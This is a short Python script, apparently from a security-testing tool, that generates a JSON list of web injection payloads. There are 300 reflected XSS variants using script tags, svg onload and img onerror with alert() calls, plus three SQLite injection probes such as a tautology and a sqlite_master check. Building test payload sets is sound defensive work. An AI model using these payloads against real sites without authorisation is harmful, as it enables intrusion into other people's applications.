#!/usr/bin/env python3
import json
payloads = {}
# generate XSS payload variations
xss = []
for n in range(1,101):
    xss.append(f"<script>alert({n})</script>")
    xss.append(f"\"'><svg/onload=alert({n})>")
    xss.append(f"<img src=x onerror=alert({n})>")
payloads['reflected_xss'] = {'owasp':'A03:2023-Injection','notes':'Reflected XSS variations','payloads': xss}
# sqlite
sqli = ["1' OR '1'='1' --","'; SELECT sqlite_version() --","' OR EXISTS(SELECT 1 FROM sqlite_master) --"]
payloads['sqlite'] = {'owasp':'A03:2023-Injection','notes':'SQLite probes','payloads': sqli}
open('app/data/payloads_expanded.json','w',encoding='utf-8').write(json.dumps(payloads, ensure_ascii=False, indent=2))
print('KB generated with categories:', list(payloads.keys()))
